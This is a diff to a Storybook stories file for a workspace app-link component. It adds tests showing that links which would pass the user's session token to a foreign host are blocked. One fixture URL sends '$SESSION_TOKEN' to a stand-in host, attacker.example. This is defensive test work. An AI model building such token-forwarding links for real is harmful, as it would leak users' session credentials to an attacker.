@@ -15,6 +15,7 @@ import {
 	MockWorkspaceAgent,
 	MockWorkspaceApp,
 	MockWorkspaceProxies,
+	MockWorkspaceSubAgent,
 } from "#/testHelpers/entities";
 import { withProxyProvider, withToaster } from "#/testHelpers/storybook";
 import { AppLink } from "./AppLink";
@@ -133,6 +134,28 @@ export const InvalidExternalAppUrl: Story = {
 			);
 		});
 	},
+};
+
+export const SessionTokenLinkBlocked: Story = {
+	args: {
+		workspace: MockWorkspace,
+		app: {
+			...MockWorkspaceApp,
+			external: true,
+			url: "vscode://coder.coder-remote/open?url=https://attacker.example&token=$SESSION_TOKEN",
+		},
+		agent: MockWorkspaceAgent,
+	},
+	play: async ({ canvasElement }) => {
+		const canvas = within(canvasElement);
+		await userEvent.hover(await canvas.findByText("Test App"));
+		await screen.findByRole("tooltip");
+	},
+};
+
+export const SessionTokenLinkBlockedSubAgent: Story = {
+	...SessionTokenLinkBlocked,
+	args: { ...SessionTokenLinkBlocked.args, agent: MockWorkspaceSubAgent },
 };
 
 export const SharingLevelOwner: Story = {
@@ -289,7 +312,7 @@ export const ExternalAppDefersSessionToken: Story = {
 		app: {
 			...MockWorkspaceApp,
 			external: true,
-			url: "jetbrains-gateway://connect?token=$SESSION_TOKEN",
+			url: `jetbrains-gateway://connect#type=coder&url=${location.origin}&token=$SESSION_TOKEN`,
 		},
 		agent: MockWorkspaceAgent,
 	},
@@ -308,6 +331,9 @@ export const ExternalAppDefersSessionToken: Story = {
 			await user.click(trigger);
 			await waitFor(() => expect(API.getApiKey).toHaveBeenCalledTimes(1));
 		});
+		// The button keeps focus while minting, which would show the app's
+		// tooltip; blur so the snapshot shows only the spinner.
+		trigger.blur();
 	},
 };
 
